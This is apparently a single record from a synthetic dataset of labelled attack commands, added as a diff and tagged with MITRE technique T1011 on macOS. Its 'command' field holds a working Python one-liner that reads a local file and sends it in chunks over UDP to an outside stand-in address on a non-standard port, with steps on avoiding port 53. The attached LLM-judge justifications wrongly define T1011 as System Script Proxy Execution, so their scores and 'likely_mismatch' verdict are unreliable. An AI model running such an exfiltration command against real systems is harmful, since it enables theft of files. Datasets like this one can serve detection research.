@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket,uuid; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=(\"203.0.113.200\", 53530); tid=str(uuid.uuid4()).encode(); d=open(\"/Users/Shared/.dmp\",\"rb\").read(); [ s.sendto(tid+b\"|\"+d[i:i+500], addr) for i in range(0,len(d),500) ]; s.close()'",
+  "explanation": "Chunks data into UUID-tagged UDP datagrams to a high, non-standard port, simulating a DNS-like alternate medium without using the common DNS port, aligning with T1011.",
+  "rationale_steps": [
+    "Open a UDP socket and choose a non-standard high port (53530) to avoid 53.",
+    "Tag each chunk with a transaction ID to reassemble remotely.",
+    "Use UDP as an alternate medium distinct from primary C2 channels.",
+    "No obfuscation; user-space only."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-022e3e02",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and brackets, proper semicolon separators, valid Python syntax for imports, variable assignments, list comprehension, and function calls.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over UDP to a non-standard port which aligns with the concept of alternate data channels, it doesn't actually use system script proxy execution as described in T1011 which requires abusing trusted/signed system scripts.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T04:27:37.811867Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed, with balanced delimiters, correct syntax for statements, and valid `python3 -c` usage.",
+        "semantic_score": 1,
+        "semantic_justification": "The command correctly performs data exfiltration as described, but it directly executes via the `python3` interpreter, failing to leverage a trusted system script as a proxy, which is the defining characteristic of T1011.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T04:27:48.580477Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is well-formed with balanced quotes/parentheses, valid imports, proper semicolon-separated statements, and a valid list comprehension.",
+        "semantic_score": 1,
+        "semantic_justification": "It exfiltrates file data over UDP from macOS using Python, not abusing signed system scripts or Windows script hosts as described for System Script Proxy Execution.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T04:28:05.998798Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
